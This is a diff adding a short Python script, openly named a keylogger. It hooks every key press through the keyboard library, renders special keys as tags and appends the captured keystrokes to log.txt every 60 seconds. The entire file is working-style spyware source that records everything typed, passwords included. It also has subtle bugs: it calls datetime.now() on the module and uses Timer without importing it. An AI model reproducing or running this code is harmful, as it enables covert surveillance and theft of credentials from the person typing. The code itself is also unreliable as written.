@@ -1,0 +1,44 @@
+import keyboard
+import datetime
+
+class Keylogger:
+    def __init__(self, interval, report_method="file"):
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "ctrl":
+                name = "[CTRL]"
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+
+    def report(self):
+        if self.report_method == "file":
+            with open("log.txt", "a") as f:
+                f.write(self.log + "\n")
+            print(f"{datetime.now()} - Log saved to log.txt")
+        self.log = ""
+        timer = Timer(self.interval, self.report)
+        timer.start()
+
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_press(self.callback)
+        self.report()
+        print(f"{datetime.now()} - Started keylogger")
+        keyboard.wait()
+
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=60, report_method="file")
+    keylogger.start()
